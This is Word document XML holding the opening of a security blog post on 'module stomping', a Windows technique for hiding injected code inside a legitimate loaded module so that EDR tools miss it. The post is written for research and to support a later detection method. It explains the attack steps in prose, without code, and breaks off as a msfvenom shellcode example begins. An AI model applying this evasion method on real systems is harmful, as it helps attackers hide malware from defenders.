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63DDC4" w14:textId="77777777" w:rsidR="00435631" w:rsidRPr="00A45B14" w:rsidRDefault="001D0EBC" w:rsidP="003C5514">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A45B14">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Hiding malicious code with “Module Stomping”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493F6977" w14:textId="77777777" w:rsidR="001936A9" w:rsidRPr="004B4AA4" w:rsidRDefault="00A00853" w:rsidP="001D0EBC">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BDDC17" w14:textId="1A0B9682" w:rsidR="00A00853" w:rsidRPr="004B4AA4" w:rsidRDefault="004B4AA4" w:rsidP="001936A9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Attackers</w:t>
      </w:r>
      <w:r w:rsidR="00A00853" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deploy</w:t>
      </w:r>
      <w:r w:rsidR="00A00853" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> increasingly sophisticated methods of hiding their malicious code on a running system. One such technique is “module stomping”, which involves overwriting loaded modules with malicious code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB11A60" w14:textId="28130099" w:rsidR="00380E7D" w:rsidRPr="001E7AD6" w:rsidRDefault="00A00853" w:rsidP="00380E7D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">In this blog post, the first of a three-part series, we will explore module stomping and </w:t>
      </w:r>
      <w:r w:rsidR="00380E7D" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>implement a simple PoC injector</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00E247AF" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">We </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>will then generali</w:t>
      </w:r>
      <w:r w:rsidR="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> this approach </w:t>
      </w:r>
      <w:r w:rsidR="00E247AF" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">in the second part of the series </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="00E247AF" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">stealthily </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>inject almost any C++ code into memory</w:t>
      </w:r>
      <w:r w:rsidR="00E247AF" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">art three </w:t>
      </w:r>
      <w:r w:rsidR="00E247AF" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">of the series </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>will detai</w:t>
      </w:r>
      <w:r w:rsidR="00380E7D" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>l detection and countermeasures - including a new detection technique fast enough to be used in real-time background scanners.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4D9B4E" w14:textId="77777777" w:rsidR="00A00853" w:rsidRPr="001E7AD6" w:rsidRDefault="00A00853" w:rsidP="00A00853">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Code injection in 2019</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4BF5A6" w14:textId="4AED3FE4" w:rsidR="00A00853" w:rsidRPr="001E7AD6" w:rsidRDefault="00A00853" w:rsidP="001936A9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Cross-process memory injection, in which an attacker hides their code in a legitimate process, has long been used as a means </w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>of evading</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1BB3E0" w14:textId="533331D4" w:rsidR="001936A9" w:rsidRPr="001E7AD6" w:rsidRDefault="001936A9" w:rsidP="001936A9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Naïve attackers might compile their attack tools into a module and upload it to the compromised</w:t>
      </w:r>
      <w:r w:rsidR="0026730F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>machine, hoping that no-one will notice – but pretty much every EDR agent will spot</w:t>
      </w:r>
      <w:r w:rsidR="00A00853" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> unusual module loads</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Sophisticated attackers are more likely to perform </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">a reflective load of their malicious code, leaving no trace in the loaded module list </w:t>
      </w:r>
      <w:r w:rsidR="00382D36" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>for the process</w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> while </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">avoiding the risks of writing executable code to disk. </w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>However, a</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ny EDR worth its salt</w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>will be good at spotting the art</w:t>
      </w:r>
      <w:r w:rsidR="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>facts and tell</w:t>
      </w:r>
      <w:r w:rsidR="0026730F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">tale oddities </w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">such an operation – </w:t>
      </w:r>
      <w:r w:rsidR="00C85267" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">such as </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>calls to VirtualProtec</w:t>
      </w:r>
      <w:r w:rsidR="00382D36" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>t and VirtualAlloc, or executable ranges which represent no module</w:t>
      </w:r>
      <w:r w:rsidR="00A00853" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the disk</w:t>
      </w:r>
      <w:r w:rsidR="00382D36" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD078A9" w14:textId="19C5ADE3" w:rsidR="00380E7D" w:rsidRPr="001E7AD6" w:rsidRDefault="001936A9" w:rsidP="001936A9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>One more advanced attack, known as “module stomping”, does not leave these art</w:t>
      </w:r>
      <w:r w:rsidR="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">facts. With no malicious module loaded into memory, and no </w:t>
      </w:r>
      <w:r w:rsidR="00A00853" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unusual</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> reflective-load </w:t>
      </w:r>
      <w:r w:rsidR="00A00853" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>events</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, it is tricky to detect</w:t>
      </w:r>
      <w:r w:rsidR="00F97999" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> at scale</w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and is also incredibly simple to perform</w:t>
      </w:r>
      <w:r w:rsidR="00F97999" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6C35C5" w14:textId="405A04DC" w:rsidR="0026730F" w:rsidRPr="001E7AD6" w:rsidRDefault="001936A9" w:rsidP="001936A9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">To make use of this technique, an attacker will first </w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cause</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a legitimate process to load some </w:t>
      </w:r>
      <w:r w:rsidR="0026730F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">equally </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>legitimate module</w:t>
      </w:r>
      <w:r w:rsidR="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> it does not require</w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, typically via an injected LoadLibrary call.</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Then, the attacker will simply copy their malicious </w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> over the same memory regions used by th</w:t>
      </w:r>
      <w:r w:rsidR="002A3C28" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>module</w:t>
      </w:r>
      <w:r w:rsidR="002A3C28" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in question</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B1AE89" w14:textId="2BF9F2CA" w:rsidR="001936A9" w:rsidRPr="001E7AD6" w:rsidRDefault="001936A9" w:rsidP="001936A9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Voila – the attacker’s code is </w:t>
      </w:r>
      <w:r w:rsidR="00FB0034" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">in memory, with no VirtualAlloc calls, </w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="00FB0034" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> VirtualProtect</w:t>
      </w:r>
      <w:r w:rsidR="00FB0034" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> calls</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Only </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">a legitimate (and usually signed) module </w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r w:rsidR="002A3C28" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ill</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> appear </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to be loaded in the host process.</w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0026730F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The malicious code can only be detected </w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">by checking the memory ranges against a known-good copy of the legitimate module – an </w:t>
      </w:r>
      <w:r w:rsidR="0026730F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">infeasible </w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>operation for real-time scanners.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4772601D" w14:textId="2DE4CAEC" w:rsidR="006C0288" w:rsidRPr="001E7AD6" w:rsidRDefault="00380E7D" w:rsidP="001936A9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Despite </w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>its utility</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, we have only see</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limited real</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>world application of th</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> technique. However, with the rise of EDR</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>it’s quite possible th</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>is method</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> will be used more widely in the future,</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> especially now that </w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">module stomping functionality is included in version 3.11of Cobalt Strike (April 9, 2018). For this reason, </w:t>
      </w:r>
      <w:r w:rsidR="00AD331D" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the technique</w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> definitely</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003021FB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">merits </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>further investigation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DE0856" w14:textId="77777777" w:rsidR="00FB0034" w:rsidRPr="001E7AD6" w:rsidRDefault="006C0288" w:rsidP="001D0EBC">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Simple payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F28FE1" w14:textId="4947AE96" w:rsidR="00A4216F" w:rsidRPr="001E7AD6" w:rsidRDefault="006C0288" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>For simple payloads, consisting sol</w:t>
      </w:r>
      <w:r w:rsidR="007309B0" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ely of a relocatable binary blob</w:t>
      </w:r>
      <w:r w:rsidR="00A4216F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of shellcode</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, the attack is </w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">very </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">straightforward. </w:t>
      </w:r>
      <w:r w:rsidR="00A4216F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">These attacks simply inject a sequence of instructions into memory and execute them. This shellcode must be written in such a way that </w:t>
      </w:r>
      <w:r w:rsidR="004934A9" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">it </w:t>
      </w:r>
      <w:r w:rsidR="00A4216F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">can execute from any executable region in memory, so </w:t>
      </w:r>
      <w:r w:rsidR="004934A9" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">it </w:t>
      </w:r>
      <w:r w:rsidR="00A4216F" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>is usually written in assembly or machine code. Because of this, its complexity is typically limited, and commonly its only task is to open a shell (hence the name!) or to download and execute the “real” payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65866CE6" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="00F5436A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>How simple is simple?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710C9C4D" w14:textId="77777777" w:rsidR="00A4216F" w:rsidRPr="001E7AD6" w:rsidRDefault="00A4216F" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>To keep things focussed, we are going to use some off-the-shelf shellcode, rather than craft our own. We will use the Metasploit project’s “msfv</w:t>
      </w:r>
      <w:r w:rsidR="00A62160" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>enom</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>” tool to do this</w:t>
      </w:r>
